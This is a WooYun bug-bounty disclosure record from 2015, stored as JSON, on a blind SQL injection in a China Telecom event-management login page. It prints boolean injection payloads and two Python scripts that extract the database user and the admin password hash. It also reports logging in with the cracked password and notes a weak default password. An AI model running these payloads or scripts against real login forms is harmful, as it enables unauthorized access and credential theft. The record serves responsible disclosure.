{"id": 69672, "wybug_id": "wooyun-2015-0137233", "wybug_title": "中国电信某分站存在SQL注入漏洞泄漏大量敏感信息（附验证脚本）", "wybug_corp": "中国电信", "wybug_author": "浮萍", "wybug_date": "2015-08-29 09:05", "wybug_open_date": "2015-10-15 17:48", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-08-29：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-08-31：\tcncert国家互联网应急中心暂未能联系到相关单位，细节仅向通报机构公开\t\t\t\t\t\t\t\t\t2015-09-10：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-09-20：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-09-30：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-10-15：\t细节向公众公开  简要描述： SQL注入 详细说明：  http://**.**.**.**/web/login.do中国电信增值业务运营中心事件管理系统\n\n当输入不存在的用户时 会提示用户名不存在\n\n当输入a'or'1'='1时\n\n提示密码错误\n\n抓包用户名输入admin时提示密码错误表示存在用户admin\n\n\nadmin'and/**/length(SYS_CONTEXT('USERENV','CURRENT_USER'))>0/**/and'a'='a\n\n\n\nadmin'and/**/length(SYS_CONTEXT('USERENV','CURRENT_USER'))=8/**/and'a'='a\n\n\n表示当前用户有8位根据猜解\nadmin'and/**/substr(SYS_CONTEXT('USERENV','CURRENT_USER'),1,1)='B'/**/and'a'='a\n\n\n第一位为B根据验证脚本获取到如下结果\n\n可知当期用户为BRIGHTSM验证脚本如下\n#encoding=utf-8import httplibimport timeimport stringimport sysimport randomimport urllibheaders = {'Content-Type': 'application/x-www-form-urlencoded'}payloads = 'ABCDEFGHIGKLMNOPQRSTUVWXYZ@_0123456789'#payloads ='0123456789ABCDEF'print 'start to retrive user:'user = ''for i in range(1,9):    for payload in payloads:        conn = httplib.HTTPConnection('**.**.**.**',timeout=60)        params = {            'j_password': '0cc175b9c0f1b6a831c399e269772661',            'txtPassword': 'a',          \t\t\t'j_username': \"admin'and/**/ascii(SUBSTR(SYS_CONTEXT('USERENV','CURRENT_USER'),%s,1))=%s\" % (i, ord(payload)) +\"/**/and/**/'a'='a\",\t\t\t            'txtUserName': 'a',\t\t\t\t\t\t'x':61,\t\t\t\t\t\t'y':26            }        conn.request(method='POST',                     url='/web/j_security_check',                     body = urllib.urlencode(params),                     headers = headers)        resp = conn.getresponse()        html_doc = resp.read()        conn.close()        print '.',        if html_doc.count('密码错误！') > 0:  # True            user += payload            print '\\n[in progress]', user            breakprint 'user is', user\n   漏洞证明：  同样可以获取到用户的密码这里以admin为例已知密码为md5加密 这里截取9-24位\nadmin'and/**/ascii(SUBSTR(password,1,1))=49/**/and/**/'a'='a\n\n\n则第9位对应的密码为1附脚本\n#encoding=utf-8import httplibimport timeimport stringimport sysimport randomimport urllibheaders = {'Content-Type': 'application/x-www-form-urlencoded'}payloads ='0123456789ABCDEF'print 'start to retrive admin\\'s password:'user = ''for i in range(9,25):    for payload in payloads:        conn = httplib.HTTPConnection('**.**.**.**',timeout=60)        params = {            'j_password': '0cc175b9c0f1b6a831c399e269772661',            'txtPassword': 'a',           'j_username': \"admin'and/**/ascii(SUBSTR(password,%s,1))=%s\" % (i, ord(payload)) +\"/**/and/**/'a'='a\",\t\t\t            'txtUserName': 'a',\t\t\t\t\t\t'x':61,\t\t\t\t\t\t'y':26            }        conn.request(method='POST',                     url='/web/j_security_check',                     body = urllib.urlencode(params),                     headers = headers)        resp = conn.getresponse()        html_doc = resp.read()        conn.close()        #print html_doc        #print params        print '.',        if html_doc.count('密码错误！') > 0:  # True            user += payload            print '\\n[in progress]', user            breakprint '\\nadmin\\'s password is', user\n\n\n则对应的加密后的密码为1820×××××××A8FBD2解密后结果为7u×××OKM登录\n\n客服工单\n\n详情\n\n条数\n\n\n\n用户管理（存在弱口令000000）\n\n\n\n可以同步用户的权限\n\n\n\n   修复方案：     版权声明：转载请注明来源 浮萍@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：11  确认时间：2015-08-31 17:46 厂商回复： CNVD确认并复现所述漏洞情况，已经转由CNCERT向中国电信集团公司通报，由其后续协调网站管理单位处置。  最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 11, "Ranks": null}